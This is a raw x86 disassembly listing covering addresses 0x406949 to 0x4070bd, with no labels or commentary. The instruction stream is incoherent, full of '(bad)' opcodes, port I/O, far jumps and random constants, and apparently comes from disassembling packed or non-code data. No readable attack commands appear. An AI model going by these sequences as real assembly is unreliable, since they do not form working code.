  406949:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40694a:	mov    ch,BYTE PTR [ecx+0x1e]
  40694d:	pop    ss
  40694e:	mov    ebx,0x918746e6
  406953:	inc    ebx
  406954:	popa   
  406955:	rol    DWORD PTR [ebx+0x41],1
  406958:	jp     0x4068e0
  40695a:	enter  0xb598,0xd5
  40695e:	and    eax,0x24e04ca6
  406963:	aas    
  406964:	mov    eax,0xe2212a6f
  406969:	pushf  
  40696a:	sahf   
  40696b:	loope  0x40699b
  40696d:	push   eax
  40696e:	ins    DWORD PTR es:[edi],dx
  40696f:	dec    ecx
  406970:	jbe    0x4069d7
  406972:	jp     0xb990c7ec
  406978:	jo     0x4069b8
  40697a:	pop    eax
  40697b:	das    
  40697c:	pop    eax
  40697d:	leave  
  40697e:	xchg   esp,eax
  40697f:	mov    esi,0x25fc6635
  406984:	pop    ecx
  406985:	inc    edi
  406986:	ja     0x4069d5
  406988:	sub    edi,DWORD PTR [ecx-0x4c174a60]
  40698e:	je     0x4069e6
  406990:	and    ecx,0xffffffae
  406993:	std    
  406994:	pop    ebx
  406995:	adc    eax,0xab3037fa
  40699a:	mov    ebp,0x732397d8
  40699f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069a0:	mov    al,0xe4
  4069a2:	jle    0x40698e
  4069a4:	dec    DWORD PTR [ebp-0x67]
  4069a7:	jecxz  0x4069c9
  4069a9:	xor    al,0x7d
  4069ab:	push   esi
  4069ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4069ad:	fadd   QWORD PTR ds:0xafc9a867
  4069b3:	(bad)  
  4069b5:	int    0xb7
  4069b7:	jle    0x4069a2
  4069b9:	shr    BYTE PTR [ebx+edx*1-0x26],1
  4069bd:	popa   
  4069be:	push   edi
  4069bf:	adc    BYTE PTR [esi-0x37b7b129],al
  4069c5:	add    ch,cl
  4069c7:	out    dx,eax
  4069c8:	pop    eax
  4069c9:	or     bl,BYTE PTR [eax+0x4c]
  4069cc:	mov    ds:0x662b62bb,al
  4069d1:	fldenv [ecx+0x6b1c0bab]
  4069d7:	push   ecx
  4069d8:	inc    ecx
  4069d9:	shr    DWORD PTR [edi+ecx*4-0x65],0x55
  4069de:	mov    BYTE PTR [esi-0x1997e7f1],0x54
  4069e5:	daa    
  4069e6:	into   
  4069e7:	xor    al,0x15
  4069e9:	xor    BYTE PTR [edx+0xe],ah
  4069ec:	push   0xffffff9f
  4069ee:	call   FWORD PTR [edi-0x27]
  4069f1:	jecxz  0x40699c
  4069f3:	xchg   DWORD PTR [edx-0x46],eax
  4069f6:	mov    dh,0x61
  4069f8:	push   0x8f8eaf2
  4069fd:	or     ecx,ecx
  4069ff:	inc    ebp
  406a00:	mov    ch,ch
  406a02:	xor    bh,al
  406a04:	dec    esp
  406a05:	loopne 0x4069c8
  406a07:	lods   eax,DWORD PTR ds:[esi]
  406a08:	mov    DWORD PTR [ebp-0xb],edx
  406a0b:	sub    BYTE PTR [esi-0x6d8d8082],dh
  406a11:	xor    bh,BYTE PTR [edx+0x12695f80]
  406a17:	sub    ecx,DWORD PTR [edi+0x71]
  406a1a:	loop   0x4069d3
  406a1c:	push   edi
  406a1d:	retf   0xbc3e
  406a20:	mov    al,0x8
  406a22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a23:	or     BYTE PTR [ebx],bl
  406a25:	adc    al,0x90
  406a27:	mov    ecx,0x30ef7b82
  406a2c:	inc    ecx
  406a2d:	sub    DWORD PTR [ebp+0x4292414b],eax
  406a33:	xor    DWORD PTR [edi+0x68],ebp
  406a36:	gs push es
  406a38:	outs   dx,BYTE PTR ds:[esi]
  406a39:	and    al,0x70
  406a3b:	lods   eax,DWORD PTR ds:[esi]
  406a3c:	pushf  
  406a3d:	jb     0x406a1d
  406a3f:	test   dl,0xb6
  406a42:	sbb    BYTE PTR [ecx],cl
  406a44:	adc    esi,DWORD PTR [edi-0x49]
  406a47:	pop    edx
  406a48:	sub    edx,edx
  406a4a:	pop    ebp
  406a4b:	mov    al,0xe8
  406a4d:	stc    
  406a4e:	push   esp
  406a4f:	push   ss
  406a50:	cmc    
  406a51:	aas    
  406a52:	cmp    eax,0xfead8c47
  406a57:	add    eax,0x29f14bf5
  406a5c:	imul   esi,eax,0x7b
  406a5f:	rcr    BYTE PTR [edx-0x26],cl
  406a62:	fs mov cl,0x59
  406a65:	mov    edx,0x549b7d69
  406a6a:	(bad)  
  406a6b:	enter  0x5542,0x62
  406a6f:	dec    edx
  406a70:	pushf  
  406a71:	push   ebp
  406a72:	dec    eax
  406a73:	fistp  DWORD PTR [eax-0x57]
  406a76:	ins    BYTE PTR es:[edi],dx
  406a77:	or     eax,0x2c55eef6
  406a7c:	mov    fs,WORD PTR ds:0x87d27552
  406a82:	xchg   ebp,eax
  406a83:	xchg   edx,eax
  406a84:	jmp    0xe390:0xc82b6554
  406a8b:	fiadd  DWORD PTR [ebp+0x37d212ec]
  406a91:	(bad)
  406a95:	jae    0x406a50
  406a97:	pop    esi
  406a98:	aas    
  406a99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a9a:	sti    
  406a9b:	es push ds
  406a9d:	stos   DWORD PTR es:[edi],eax
  406a9e:	or     DWORD PTR [esi+esi*1],ebp
  406aa1:	in     eax,dx
  406aa2:	sub    al,0xeb
  406aa4:	xchg   eax,ebp
  406aa6:	fsub   st(3),st
  406aa8:	mov    al,0x30
  406aaa:	hlt    
  406aab:	js     0x406a3f
  406aad:	lds    ecx,FWORD PTR [ebx+0x58]
  406ab0:	mov    edx,0x656af316
  406ab5:	xchg   ecx,eax
  406ab6:	dec    ecx
  406ab7:	cs jae 0x406b29
  406aba:	shr    ah,cl
  406abc:	xor    al,0x88
  406abe:	inc    ebp
  406abf:	add    DWORD PTR [ecx-0x10d7fc38],ecx
  406ac5:	push   edi
  406ac6:	imul   eax,edi,0x8c2b7cec
  406acc:	push   0xffffffa3
  406ace:	in     al,0xed
  406ad0:	push   ss
  406ad1:	jbe    0x406a65
  406ad3:	inc    eax
  406ad4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ad5:	imul   edx,ebp,0xffffffa8
  406ad8:	pop    edi
  406ad9:	sub    BYTE PTR [esi+0x13],dh
  406adc:	mov    bh,0x2b
  406ade:	mov    edx,0xf622c34a
  406ae3:	lahf   
  406ae4:	pop    edx
  406ae5:	lahf   
  406ae6:	mov    eax,0x259e3457
  406aeb:	inc    esi
  406aec:	mov    al,0x9b
  406aee:	pop    eax
  406aef:	add    eax,0xcadcf183
  406af4:	push   ecx
  406af5:	adc    BYTE PTR [edi+0x11],ch
  406af8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406af9:	dec    ebp
  406afa:	(bad)  
  406afb:	push   cs
  406afc:	sbb    ebp,DWORD PTR [esi]
  406afe:	pop    edx
  406aff:	retf   
  406b00:	or     ah,BYTE PTR [ebx-0x258f5c6d]
  406b06:	sub    eax,DWORD PTR [ecx]
  406b08:	and    al,0x43
  406b0a:	je     0x406afd
  406b0c:	xor    al,0x1f
  406b0e:	dec    ecx
  406b0f:	loop   0x406abc
  406b11:	mov    ss,esp
  406b13:	adc    eax,0x255a1d15
  406b18:	cld    
  406b19:	jge    0x406acd
  406b1b:	xchg   ecx,eax
  406b1c:	xor    DWORD PTR [ecx+0x12c7ca28],ebx
  406b22:	shr    DWORD PTR [ebp-0x5e],cl
  406b25:	mov    ch,0x1f
  406b27:	dec    edx
  406b28:	nop
  406b29:	push   esp
  406b2a:	addr16 mov ah,0x26
  406b2d:	shl    BYTE PTR [esi-0x67],cl
  406b30:	xchg   ecx,edi
  406b32:	aaa    
  406b33:	cld    
  406b34:	test   DWORD PTR [edi-0x19],eax
  406b37:	lock jnp 0x406ba0
  406b3a:	mov    al,BYTE PTR [ebp-0x20]
  406b3d:	mov    ch,0x71
  406b3f:	dec    ecx
  406b40:	fiadd  WORD PTR [ebx]
  406b42:	push   es
  406b43:	jo     0x406b09
  406b45:	mov    ch,0x55
  406b47:	push   ebx
  406b48:	mov    dh,0xe2
  406b4a:	push   esp
  406b4b:	sbb    esp,DWORD PTR [ebx-0x1c]
  406b4e:	mov    BYTE PTR [ebx-0x2c20081c],dh
  406b54:	cld    
  406b55:	or     eax,0x4ca4d0b0
  406b5a:	xchg   ebp,eax
  406b5b:	scas   al,BYTE PTR es:[edi]
  406b5c:	enter  0x23be,0x34
  406b60:	xor    esi,DWORD PTR [edi+0x35]
  406b63:	mov    ah,0xf2
  406b65:	nop
  406b66:	push   esp
  406b67:	add    DWORD PTR [ecx+0x7d],esi
  406b6a:	xchg   edi,eax
  406b6b:	mov    dh,0xe1
  406b6d:	adc    BYTE PTR [esi-0x25c27194],bh
  406b73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b74:	neg    ebp
  406b76:	or     BYTE PTR [ebx-0x48725fbd],dh
  406b7c:	sub    dh,BYTE PTR [ebx-0x64d59902]
  406b82:	sub    esi,DWORD PTR [edi+0x38d4f4a6]
  406b88:	in     al,0x94
  406b8a:	mov    bh,0x7c
  406b8c:	cmc    
  406b8d:	sbb    DWORD PTR [ebp+0x7e833ba1],esp
  406b93:	xchg   BYTE PTR [edx-0x34],al
  406b96:	push   edx
  406b97:	mov    ch,dh
  406b99:	inc    edi
  406b9a:	mov    DWORD PTR [eax+0x34],ecx
  406b9d:	sub    ah,BYTE PTR [eax]
  406b9f:	mov    ds:0xe9e069dd,eax
  406ba4:	test   al,0x1
  406ba6:	cmp    ebx,DWORD PTR [ecx]
  406ba8:	push   ds
  406ba9:	dec    esp
  406baa:	add    eax,0x24ba74bf
  406baf:	adc    esp,0xffffffa8
  406bb2:	lea    edx,[ebp+0x44423d09]
  406bb8:	add    DWORD PTR [ebx+0x5e],ebp
  406bbb:	sar    DWORD PTR [edx+0x144ef84f],0x10
  406bc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406bc3:	popf   
  406bc4:	mov    WORD PTR [eax-0x32],fs
  406bc7:	out    dx,eax
  406bc8:	ret    
  406bc9:	or     BYTE PTR [esi],cl
  406bcb:	int    0x53
  406bcd:	(bad)  
  406bce:	and    al,0x3c
  406bd0:	mov    bl,0xa1
  406bd2:	mov    BYTE PTR [esi],ch
  406bd4:	fs pop ds
  406bd6:	mul    ch
  406bd8:	rol    BYTE PTR [esi-0x64],0xe4
  406bdc:	js     0x406be7
  406bde:	lods   al,BYTE PTR ds:[esi]
  406bdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406be0:	daa    
  406be1:	test   BYTE PTR [ecx],ah
  406be3:	jmp    0x406c3e
  406be5:	hlt    
  406be6:	stc    
  406be7:	pop    bp
  406be9:	add    bl,BYTE PTR [ebx+0x1a81942]
  406bef:	jg     0x406baa
  406bf1:	add    al,0x8e
  406bf3:	aad    0x36
  406bf5:	and    ebp,0xffffffe3
  406bf8:	or     al,0xd1
  406bfa:	rol    DWORD PTR [eax+ecx*2+0x60],1
  406bfe:	es jae 0x406c27
  406c01:	pop    ss
  406c02:	aam    0x6d
  406c04:	aam    0xdd
  406c06:	retf   0xe673
  406c09:	push   cs
  406c0a:	push   0xa0f48355
  406c0f:	xchg   ecx,eax
  406c10:	or     al,al
  406c12:	fiadd  DWORD PTR [ecx]
  406c14:	jg     0x406c7e
  406c16:	jns    0x406c0c
  406c18:	fwait
  406c19:	push   ds
  406c1a:	pop    ecx
  406c1b:	out    0xaf,eax
  406c1d:	in     al,dx
  406c1e:	(bad)  
  406c1f:	xor    dl,cl
  406c21:	in     eax,0xde
  406c23:	fdivr  QWORD PTR [eax+0x4a59cd93]
  406c29:	shr    BYTE PTR [eax+ebp*4],1
  406c2c:	cmp    ecx,eax
  406c2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c2f:	fidivr DWORD PTR [edx+0x68]
  406c32:	jnp    0x406c8b
  406c34:	in     eax,0xfc
  406c36:	inc    edx
  406c37:	ret    
  406c38:	out    dx,eax
  406c39:	add    eax,0x884755f5
  406c3e:	sahf   
  406c3f:	cli    
  406c40:	and    BYTE PTR [esi+0x4da63984],dl
  406c46:	nop
  406c47:	pop    esi
  406c48:	mov    ds:0xe5ea9b01,al
  406c4d:	jp     0x406c12
  406c4f:	cmp    ebp,edi
  406c51:	adc    ebx,ebp
  406c53:	inc    ebp
  406c54:	das    
  406c55:	dec    ebp
  406c56:	pop    ss
  406c57:	loope  0x406c62
  406c59:	shr    edx,cl
  406c5b:	dec    ecx
  406c5c:	repnz xor ebp,ebp
  406c5f:	mov    esi,0x5e4fcd68
  406c64:	mov    ss,ecx
  406c66:	and    DWORD PTR [ecx+0x4ab377ae],eax
  406c6c:	in     al,0x1
  406c6e:	cmp    edx,DWORD PTR [esp+0x31]
  406c72:	scas   al,BYTE PTR es:[edi]
  406c73:	jae    0x406c58
  406c75:	add    DWORD PTR [ecx+ecx*4],eax
  406c78:	mov    ds:0x18c882dd,al
  406c7d:	and    dh,al
  406c7f:	sub    cl,BYTE PTR [eax-0x21a09086]
  406c85:	mov    bh,ah
  406c87:	fld    TBYTE PTR [edi+0x48805f16]
  406c8d:	xchg   ecx,eax
  406c8e:	(bad)  
  406c8f:	daa    
  406c90:	add    bl,bl
  406c92:	dec    edx
  406c93:	pop    eax
  406c94:	add    esp,ebx
  406c96:	aad    0xca
  406c98:	sub    edi,DWORD PTR [edi]
  406c9a:	sub    al,0x4c
  406c9c:	es aaa 
  406c9e:	aaa    
  406c9f:	out    0xa5,al
  406ca1:	sti    
  406ca2:	sahf   
  406ca3:	cmc    
  406ca4:	mov    cl,0x62
  406ca6:	mov    ah,0x9e
  406ca8:	ficom  DWORD PTR [eax]
  406caa:	pop    ebp
  406cab:	cs jecxz 0x406ca6
  406cae:	popf   
  406caf:	pop    ds
  406cb0:	es xchg ebp,eax
  406cb2:	fwait
  406cb3:	adc    al,0x1b
  406cb5:	dec    ebx
  406cb6:	push   ecx
  406cb7:	add    al,0x3e
  406cb9:	outs   dx,DWORD PTR ds:[esi]
  406cba:	ret    
  406cbb:	test   BYTE PTR [esi+0x73],dh
  406cbe:	daa    
  406cbf:	call   ecx
  406cc1:	repz popf 
  406cc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406cc4:	test   al,0x1
  406cc6:	add    esi,edi
  406cc8:	dec    edx
  406cc9:	stc    
  406cca:	test   BYTE PTR [ecx-0x121d8047],dl
  406cd0:	add    ecx,DWORD PTR [edx-0x2319561]
  406cd6:	fsubr  DWORD PTR cs:[esi-0x11]
  406cda:	lds    edi,FWORD PTR [esi-0xdc95a55]
  406ce0:	pop    eax
  406ce1:	scas   eax,DWORD PTR es:[edi]
  406ce2:	stos   BYTE PTR es:[edi],al
  406ce3:	fsubr  st,st(2)
  406ce5:	inc    esi
  406ce6:	lods   al,BYTE PTR gs:[esi]
  406ce8:	ja     0x406cc5
  406cea:	icebp  
  406ceb:	mov    cl,0xa6
  406ced:	ret    0x8e9e
  406cf0:	imul   ebp,DWORD PTR [di],0xa30b3748
  406cf7:	xor    al,ah
  406cf9:	call   0xd5a22018
  406cfe:	pop    ss
  406cff:	aas    
  406d00:	in     eax,dx
  406d01:	xlat   BYTE PTR ds:[ebx]
  406d02:	xor    cl,BYTE PTR [ecx-0xf]
  406d05:	add    DWORD PTR [ecx-0x1a3e4487],edx
  406d0b:	fimul  DWORD PTR [ebx-0x39a9ec98]
  406d11:	(bad)  
  406d12:	sbb    eax,0xb185f2cd
  406d17:	push   cs
  406d18:	inc    ebx
  406d19:	jnp    0x406cc1
  406d1b:	int    0x4f
  406d1d:	cmc    
  406d1e:	mov    ds:0x8ab8a728,al
  406d23:	xchg   esp,eax
  406d24:	(bad)  
  406d25:	loopne 0x406cbb
  406d27:	lds    esi,FWORD PTR [edx+ebp*8+0x589aabd]
  406d2e:	dec    ecx
  406d2f:	ret    
  406d30:	scas   al,BYTE PTR es:[edi]
  406d31:	dec    ebp
  406d32:	jge    0x406d2b
  406d34:	jae    0x406cca
  406d36:	xor    al,0xbe
  406d38:	fs pop esp
  406d3a:	cmp    BYTE PTR gs:[edx+0x2ea4b1ff],cl
  406d41:	adc    al,0x7f
  406d43:	faddp  st(4),st
  406d45:	push   esi
  406d46:	ror    bl,1
  406d48:	adc    BYTE PTR [eax],cl
  406d4a:	out    0x6e,eax
  406d4c:	push   eax
  406d4d:	sub    eax,0x45434670
  406d52:	fldcw  WORD PTR [edi+0x3882e0a1]
  406d58:	cmp    eax,0x52bc9b3b
  406d5d:	mov    eax,0xa2cb9b28
  406d62:	jnp    0x406de3
  406d64:	out    dx,al
  406d65:	and    DWORD PTR [eax],edi
  406d67:	jg     0x406de1
  406d69:	mov    eax,ds:0xce1ef900
  406d6e:	and    al,0xb
  406d70:	inc    edx
  406d71:	leave  
  406d72:	sbb    esi,DWORD PTR [ebp-0x3b]
  406d75:	neg    ebp
  406d77:	push   ebp
  406d78:	push   ss
  406d79:	add    al,bl
  406d7b:	inc    eax
  406d7c:	in     eax,dx
  406d7d:	icebp  
  406d7e:	pop    esi
  406d7f:	add    ch,BYTE PTR [edi]
  406d81:	clc    
  406d82:	imul   ebx,DWORD PTR [ecx+0x518a064],0xec2f110e
  406d8c:	dec    edi
  406d8d:	pop    ebx
  406d8e:	add    ecx,DWORD PTR [ecx-0xa]
  406d91:	pushf  
  406d92:	inc    edi
  406d93:	rcl    dh,cl
  406d95:	imul   eax,DWORD PTR [edi],0x6d
  406d98:	mov    eax,0xd74841c8
  406d9d:	clc    
  406d9e:	jnp    0x406dad
  406da0:	xchg   ecx,eax
  406da1:	push   edi
  406da2:	push   esp
  406da3:	xchg   esi,eax
  406da4:	sbb    ch,BYTE PTR [ebp-0xa]
  406da7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406da8:	mov    eax,0x65be6e28
  406dad:	shr    BYTE PTR [ebx-0x2e205425],0x2c
  406db4:	pop    es
  406db5:	adc    DWORD PTR [edx],edx
  406db7:	mov    BYTE PTR [eax],bl
  406db9:	push   ds
  406dba:	xchg   edi,eax
  406dbb:	sbb    BYTE PTR [esi+eax*2+0x7d],dl
  406dbf:	mov    cl,0x37
  406dc1:	test   ebp,ebx
  406dc3:	call   DWORD PTR [esi+0x1626ee27]
  406dc9:	pop    es
  406dca:	cli    
  406dcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406dcc:	adc    eax,0x95c5377
  406dd1:	inc    edx
  406dd2:	fld    st(6)
  406dd4:	shl    DWORD PTR [edi+0x8972e9d],1
  406dda:	jbe    0x406dae
  406ddc:	in     al,0x1a
  406dde:	fimul  DWORD PTR [eax-0x5c]
  406de1:	ins    BYTE PTR es:[edi],dx
  406de2:	je     0x406dac
  406de4:	enter  0x6c69,0xa
  406de8:	lahf   
  406de9:	clc    
  406dea:	pushf  
  406deb:	ja     0x406e1f
  406ded:	cmp    ch,BYTE PTR [eax-0x5c93278c]
  406df3:	sub    DWORD PTR [ecx-0x32],esi
  406df6:	pop    es
  406df7:	pop    edx
  406df8:	ss pop ss
  406dfa:	jg     0x406dc2
  406dfc:	ins    DWORD PTR es:[edi],dx
  406dfd:	push   ebp
  406dfe:	sbb    BYTE PTR [esi-0x1e],bh
  406e01:	and    edi,DWORD PTR [edi+0x32ded049]
  406e07:	mov    edx,0x9801495f
  406e0c:	fisub  WORD PTR ds:0x4001573d
  406e12:	xor    edi,esp
  406e14:	cmp    cl,BYTE PTR [ebp+0x15fb3fcc]
  406e1a:	cs in  al,dx
  406e1c:	das    
  406e1d:	fcmovu st,st(1)
  406e1f:	push   esi
  406e20:	sbb    al,0xc5
  406e22:	fsub   st(7),st
  406e24:	(bad)  
  406e25:	jns    0x406e9d
  406e27:	mov    es,WORD PTR [ebp-0x65]
  406e2a:	pushf  
  406e2b:	xor    DWORD PTR [esi],ebp
  406e2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e2e:	icebp  
  406e2f:	push   ss
  406e30:	xor    bl,dh
  406e32:	adc    esp,ebp
  406e34:	jne    0x406de1
  406e36:	mov    dl,0x5d
  406e38:	retf   0x45bf
  406e3b:	pop    eax
  406e3c:	add    dl,BYTE PTR [esi]
  406e3e:	jle    0x406e4a
  406e40:	jo     0x406ea7
  406e42:	fwait
  406e43:	inc    esp
  406e44:	call   0x30025c56
  406e49:	outs   dx,DWORD PTR ds:[esi]
  406e4a:	add    eax,0x1b7d9df6
  406e4f:	hlt    
  406e50:	xchg   DWORD PTR [eax-0x2cbdd941],esi
  406e56:	xchg   esp,eax
  406e57:	aas    
  406e58:	sti    
  406e59:	or     BYTE PTR [esi+0x29],ch
  406e5c:	in     eax,0x7a
  406e5e:	lods   al,BYTE PTR ds:[esi]
  406e5f:	test   BYTE PTR [edx+0x34cbd35e],ch
  406e65:	pop    ebx
  406e66:	jl     0x406e3c
  406e68:	sbb    BYTE PTR [edi-0x77],bl
  406e6b:	stos   BYTE PTR es:[edi],al
  406e6c:	not    ebx
  406e6e:	loopne 0x406e24
  406e70:	pop    ebx
  406e71:	jg     0x406e31
  406e73:	mov    dl,0x76
  406e75:	inc    ebp
  406e76:	push   edi
  406e77:	jnp    0x406e45
  406e79:	rcr    BYTE PTR [esp+edx*8],0x75
  406e7d:	xor    al,0xa4
  406e7f:	and    bh,BYTE PTR [edi]
  406e81:	or     eax,0x669f8645
  406e86:	adc    BYTE PTR [ebx],0xff
  406e89:	cmp    eax,0x76e24d64
  406e8e:	mov    eax,es
  406e90:	in     al,dx
  406e91:	mov    edx,0xf7fe72bc
  406e96:	cmp    eax,0x933b6dd0
  406e9b:	jne    0x406e67
  406e9d:	jecxz  0x406e5e
  406e9f:	pop    esi
  406ea0:	sbb    DWORD PTR [eax+0x47961d7e],ecx
  406ea6:	push   cs
  406ea7:	inc    esi
  406ea8:	or     ecx,ebx
  406eaa:	cdq    
  406eab:	dec    edi
  406eac:	inc    ecx
  406ead:	add    eax,0x2ab85689
  406eb2:	or     DWORD PTR [ebx-0x20f97738],esi
  406eb8:	out    dx,al
  406eb9:	add    eax,0x15ae5d57
  406ebe:	sub    BYTE PTR [eax+0x267f896a],bh
  406ec4:	mov    ecx,0x7ca7766d
  406ec9:	jg     0x406ef1
  406ecb:	mov    esi,0x287cc46a
  406ed0:	cwde   
  406ed1:	fistp  WORD PTR [eax-0x1188a42e]
  406ed7:	push   esi
  406ed8:	cwde   
  406ed9:	fdivr  st(7),st
  406edb:	jl     0x406f22
  406edd:	and    ebx,eax
  406edf:	pushf  
  406ee0:	dec    edi
  406ee1:	imul   bh
  406ee3:	fmul   QWORD PTR [ebp-0x38]
  406ee6:	out    dx,eax
  406ee7:	jmp    0xcacf:0x6043776c
  406eee:	ss and ch,ah
  406ef1:	rcl    BYTE PTR [esi+0x5e3fb251],cl
  406ef7:	out    0x85,eax
  406ef9:	cld    
  406efa:	xor    ecx,edi
  406efc:	mov    ah,0xe0
  406efe:	sub    dh,bh
  406f00:	xchg   ecx,eax
  406f01:	jge    0x406ee3
  406f03:	fwait
  406f04:	mov    al,0x36
  406f06:	sbb    BYTE PTR [eax-0x7c988995],ch
  406f0c:	mov    dh,BYTE PTR [esi]
  406f0e:	push   eax
  406f0f:	push   cs
  406f10:	xor    eax,0xa2995bfe
  406f15:	cmp    ecx,DWORD PTR [edx-0x7f9b80c3]
  406f1b:	push   ds
  406f1c:	ja     0x406ede
  406f1e:	retf   
  406f1f:	ds cmc 
  406f21:	in     al,dx
  406f22:	aaa    
  406f23:	cmp    BYTE PTR [esi-0x3aaca00e],bl
  406f29:	adc    al,0x14
  406f2b:	aas    
  406f2c:	mov    eax,0x666ad519
  406f31:	push   0x2b
  406f33:	sbb    BYTE PTR [ebx-0x44],0xc5
  406f37:	mov    bl,0xaf
  406f39:	lock push eax
  406f3b:	xor    eax,DWORD PTR [edi]
  406f3d:	cld    
  406f3e:	pop    ds
  406f3f:	sbb    DWORD PTR ds:0x9e8e85cb,0x99855cbe
  406f49:	inc    edi
  406f4a:	add    ebx,DWORD PTR es:[ecx]
  406f4d:	aas    
  406f4e:	sbb    BYTE PTR [edi+eiz*4+0x7015388e],ch
  406f55:	in     al,dx
  406f56:	in     al,dx
  406f57:	push   edx
  406f58:	xchg   ebx,eax
  406f59:	mov    ds:0x75337d26,eax
  406f5e:	pop    edx
  406f5f:	xchg   edi,eax
  406f60:	loopne 0x406f3a
  406f62:	int    0xca
  406f64:	out    dx,al
  406f65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f66:	loope  0x406fdb
  406f68:	xor    DWORD PTR [ebp-0x76f3281],0xffffffaf
  406f6f:	fist   DWORD PTR [ecx]
  406f71:	cmp    eax,0xf0798550
  406f76:	cli    
  406f77:	add    esi,DWORD PTR [eax+0x19]
  406f7a:	fwait
  406f7b:	call   0xecb4:0xd1b40ddd
  406f82:	inc    ebp
  406f83:	shl    DWORD PTR [esi],cl
  406f85:	lahf   
  406f86:	mov    dl,0xd0
  406f88:	leave  
  406f89:	outs   dx,BYTE PTR ds:[esi]
  406f8a:	xchg   DWORD PTR [ecx-0x5f7d1f65],esp
  406f90:	and    eax,esi
  406f92:	lods   eax,DWORD PTR ds:[esi]
  406f93:	loop   0x406f1c
  406f95:	je     0x406f1c
  406f97:	fst    DWORD PTR [eax+0x927cac0]
  406f9d:	stos   DWORD PTR es:[edi],eax
  406f9e:	inc    eax
  406f9f:	fmul   QWORD PTR [ecx+0x1e7051c6]
  406fa5:	jp     0x406f63
  406fa7:	jmp    0xbccc:0xb4b698d
  406fae:	sub    eax,0x672c5b91
  406fb3:	fisub  WORD PTR [esp+ebx*1+0x27]
  406fb7:	jbe    0x406fc8
  406fb9:	mov    ecx,0x8b27f883
  406fbe:	add    DWORD PTR [ecx+0x61f6cd95],0xffffffc9
  406fc5:	jl     0x407007
  406fc7:	addr16 jbe 0x407029
  406fca:	add    ah,0x52
  406fcd:	and    ebp,edi
  406fcf:	xlat   BYTE PTR ds:[ebx]
  406fd0:	xchg   esp,eax
  406fd1:	dec    edi
  406fd2:	sti    
  406fd3:	in     al,0x5c
  406fd5:	jg     0x406f90
  406fd7:	test   eax,0x45ddf098
  406fdc:	mov    DWORD PTR [edi],edx
  406fde:	ins    DWORD PTR es:[edi],dx
  406fdf:	aaa    
  406fe0:	faddp  st(0),st
  406fe2:	xchg   esi,eax
  406fe3:	call   0xb8de:0x749e50e7
  406fea:	push   ds
  406feb:	mov    dl,0xb1
  406fed:	shr    BYTE PTR [esi-0x70079391],cl
  406ff3:	mov    cl,ch
  406ff5:	arpl   WORD PTR [edx+0x47],bx
  406ff8:	fs fabs 
  406ffb:	push   ecx
  406ffc:	pop    esi
  406ffd:	sub    DWORD PTR [esi],eax
  406fff:	fmul   DWORD PTR [esi+esi*8+0xebd5ba2]
  407006:	lds    esi,FWORD PTR [esi-0x5a]
  407009:	fmulp  st(6),st
  40700b:	(bad)  
  40700c:	sub    ecx,DWORD PTR [ebx+0x2e471b1e]
  407012:	retf   
  407013:	call   FWORD PTR [edi]
  407015:	jp     0x406faf
  407017:	pop    ss
  407018:	sub    BYTE PTR [ebx],ah
  40701a:	ret    0x8f5
  40701d:	xor    BYTE PTR [esi],al
  40701f:	js     0x407059
  407021:	shl    BYTE PTR [esi+ebp*4-0x6c],0xb8
  407026:	dec    esi
  407027:	scas   eax,DWORD PTR es:[edi]
  407028:	mov    BYTE PTR [eax],bl
  40702a:	push   cs
  40702b:	les    edi,FWORD PTR [edx-0x20]
  40702e:	jecxz  0x406fb9
  407030:	aad    0x53
  407032:	lods   al,BYTE PTR ds:[esi]
  407033:	adc    ch,BYTE PTR [ebp+0x21]
  407036:	in     al,0x9d
  407038:	fs out 0xbb,eax
  40703b:	pop    eax
  40703c:	shl    BYTE PTR ds:0xd520058c,1
  407042:	xor    esp,DWORD PTR [edx+0x4d]
  407045:	add    BYTE PTR [ebp-0x6e],al
  407048:	xchg   edx,eax
  407049:	scas   eax,DWORD PTR es:[edi]
  40704a:	mov    ds:0x708103fe,al
  40704f:	int3   
  407050:	jae    0x406ff4
  407052:	mov    bh,0xaa
  407054:	add    al,0xd
  407056:	hlt    
  407057:	inc    eax
  407058:	imul   ch
  40705a:	xchg   ebp,eax
  40705b:	pop    edi
  40705c:	addr16 retf 0xf420
  407060:	call   0xf746:0x5c9aae08
  407067:	dec    esi
  407068:	aas    
  407069:	aad    0xc4
  40706b:	(bad)  
  40706c:	in     eax,0xa
  40706e:	or     eax,0x913e6278
  407073:	aam    0x83
  407075:	icebp  
  407076:	dec    eax
  407077:	addr16 pop ebx
  407079:	adc    dl,BYTE PTR [eax+0x596b4dee]
  40707f:	cdq    
  407080:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407081:	or     eax,0xa4f35402
  407086:	cld    
  407087:	(bad)  
  407088:	data16 hlt 
  40708a:	ins    DWORD PTR es:[edi],dx
  40708b:	scas   al,BYTE PTR es:[edi]
  40708c:	fmul   DWORD PTR [eax-0x2657a8aa]
  407092:	and    al,0xf3
  407094:	add    edx,DWORD PTR [ebx-0x3119c68a]
  40709a:	sahf   
  40709b:	and    esi,eax
  40709d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40709e:	in     eax,0x43
  4070a0:	(bad)  
  4070a1:	aad    0xa9
  4070a3:	das    
  4070a4:	ss mov edi,0xfc272a54
  4070aa:	jno    0x4070cb
  4070ac:	in     eax,0x8b
  4070ae:	stos   DWORD PTR es:[edi],eax
  4070af:	dec    esi
  4070b0:	clc    
  4070b1:	xor    esp,ebx
  4070b3:	retf   0x8e9
  4070b6:	xor    DWORD PTR [edi+edx*1+0x1a7ad32b],eax
  4070bd:	cmc    
